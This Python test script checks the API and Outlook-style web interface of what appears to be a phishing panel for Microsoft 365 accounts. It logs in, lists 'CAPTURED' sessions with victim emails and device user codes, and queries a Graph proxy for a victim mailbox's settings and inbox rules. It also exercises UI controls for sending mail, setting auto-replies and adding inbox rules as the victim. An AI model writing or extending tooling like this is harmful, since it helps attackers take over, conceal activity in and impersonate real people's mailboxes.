import time
import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

BASE_URL = "http://127.0.0.1:5000"

def test_api():
    print("[1] Testing API directly...")
    s = requests.Session()
    r = s.post(f"{BASE_URL}/api/auth/login", json={"username": "admin", "password": "admin"})
    assert r.status_code == 200, f"Login failed: {r.text}"
    print("  -> Logged in as admin successfully.")

    # Check sessions
    r_sess = s.get(f"{BASE_URL}/api/sessions")
    sessions = r_sess.json()
    captured = [x for x in sessions if x.get('status') == 'CAPTURED']
    print(f"  -> Captured accounts count: {len(captured)}")
    if not captured:
        print("  -> No captured account, will test empty state.")
        return

    uc = captured[0]['user_code']
    print(f"  -> Testing account: {uc} ({captured[0].get('victim_email')})")

    # Test settings
    r_settings = s.get(f"{BASE_URL}/api/graph_proxy/settings?user_code={uc}")
    print(f"  -> Settings API status: {r_settings.status_code}")
    if r_settings.status_code == 200:
        data = r_settings.json()
        print(f"     Timezone: {data.get('timeZone')}, AutoReply Status: {data.get('automaticRepliesSetting', {}).get('status')}")

    # Test rules
    r_rules = s.get(f"{BASE_URL}/api/graph_proxy/rules?user_code={uc}")
    print(f"  -> Rules API status: {r_rules.status_code}")
    if r_rules.status_code == 200:
        print(f"     Rules count: {len(r_rules.json().get('value', []))}")

def test_ui():
    print("\n[2] Testing UI via Headless Chrome...")
    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--window-size=1600,1000")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--disable-gpu")

    driver = webdriver.Chrome(options=opts)
    try:
        driver.get(f"{BASE_URL}/login")
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "username"))).send_keys("admin")
        driver.find_element(By.ID, "password").send_keys("admin")
        driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()

        time.sleep(1.5)
        print("  -> Logged into Web UI.")

        # Switch to Mailbox tab
        driver.execute_script("showPage('mailbox')")
        time.sleep(2)

        # 1. Check Suite Bar
        suite_bar = driver.find_element(By.CSS_SELECTOR, ".m365-suite-bar")
        settings_gear = driver.find_element(By.ID, "suite-btn-settings")
        avatar = driver.find_element(By.ID, "outlook-top-avatar")
        print(f"  -> Suite bar found! Settings gear: {settings_gear.is_displayed()}, Avatar text: '{avatar.text}'")

        # 2. Test New Mail Compose Modal
        new_mail_btn = driver.find_element(By.CSS_SELECTOR, ".ribbon-split-btn")
        new_mail_btn.click()
        time.sleep(1)

        compose_modal = driver.find_element(By.ID, "outlookComposeModal")
        assert "active" in compose_modal.get_attribute("class"), "Compose modal did not open!"
        print("  -> Genuine Compose Modal opened successfully!")

        # Verify OWA fields
        to_field = driver.find_element(By.ID, "compose-to")
        subj_field = driver.find_element(By.ID, "compose-subject")
        editor = driver.find_element(By.ID, "compose-editor")
        send_btn = driver.find_element(By.ID, "btn-send-mail")
        print(f"     To field placeholder: '{to_field.get_attribute('placeholder')}'")
        print(f"     Subject placeholder: '{subj_field.get_attribute('placeholder')}'")
        print(f"     Editor is contenteditable: '{editor.get_attribute('contenteditable')}'")
        print(f"     Send button text: '{send_btn.text.strip()}'")

        # Test Cc / Bcc toggle
        driver.execute_script("toggleCcBcc('cc')")
        cc_row = driver.find_element(By.ID, "row-compose-cc")
        print(f"     Cc row visible: {cc_row.is_displayed()}")

        # Close compose modal
        driver.execute_script("closeComposeModal()")
        time.sleep(0.5)

        # 3. Test Mailbox Settings Modal via Gear click
        settings_gear.click()
        time.sleep(1.5)

        settings_modal = driver.find_element(By.ID, "outlookSettingsModal")
        assert "active" in settings_modal.get_attribute("class"), "Settings modal did not open!"
        print("  -> Mailbox Settings Modal opened via Settings suite button!")

        # Check tabs
        tab_autoreply = driver.find_element(By.ID, "tab-nav-autoreply")
        tab_rules = driver.find_element(By.ID, "tab-nav-rules")
        tab_general = driver.find_element(By.ID, "tab-nav-general")
        print(f"     Tabs found: '{tab_autoreply.text.encode('ascii', 'replace').decode()}', '{tab_rules.text.encode('ascii', 'replace').decode()}', '{tab_general.text.encode('ascii', 'replace').decode()}'")

        # Check Automatic Replies content
        autoreply_box = driver.find_element(By.ID, "autoreply-content")
        print(f"     AutoReply status snippet: '{autoreply_box.text[:120].encode('ascii', 'replace').decode()}...'")

        # Switch to Inbox Rules tab
        tab_rules.click()
        time.sleep(1)
        rules_box = driver.find_element(By.ID, "rules-content")
        print(f"     Inbox Rules snippet: '{rules_box.text[:120].encode('ascii', 'replace').decode()}...'")

        # Test Add Rule Form toggle
        driver.execute_script("openNewRuleForm()")
        new_rule_card = driver.find_element(By.ID, "new-rule-card")
        print(f"     New Rule Form open: {new_rule_card.is_displayed()}")

        # Switch to Language & Time tab
        tab_general.click()
        time.sleep(1)
        general_box = driver.find_element(By.ID, "general-content")
        print(f"     Language & Time snippet: '{general_box.text[:120].encode('ascii', 'replace').decode()}...'")

        # Close settings modal
        driver.execute_script("closeMailboxSettings()")
        time.sleep(0.5)

        # 4. Check Email Reading Pane and Iframe Height (verify no infinite scroll!)
        msg_cards = driver.find_elements(By.CSS_SELECTOR, ".outlook-msg-card")
        print(f"  -> Email list cards count: {len(msg_cards)}")
        if msg_cards:
            msg_cards[0].click()
            time.sleep(2.5)

            iframes = driver.find_elements(By.CSS_SELECTOR, ".email-body-iframe")
            if iframes:
                iframe = iframes[0]
                h_prop = iframe.size['height']
                print(f"     Email iframe rendered! Initial settled height: {h_prop}px")

                # Wait another 3 seconds to ensure height does NOT grow endlessly
                time.sleep(3)
                h_after = iframe.size['height']
                print(f"     Height after 3s: {h_after}px (diff: {h_after - h_prop}px)")
                assert abs(h_after - h_prop) < 5, f"Infinite scroll bug detected! Height changed from {h_prop} to {h_after}"
                print("     [OK] Height is STABLE! No infinite scroll loop!")

        print("\nAll verification checks PASSED successfully!")
    finally:
        driver.quit()

if __name__ == '__main__':
    test_api()
    test_ui()
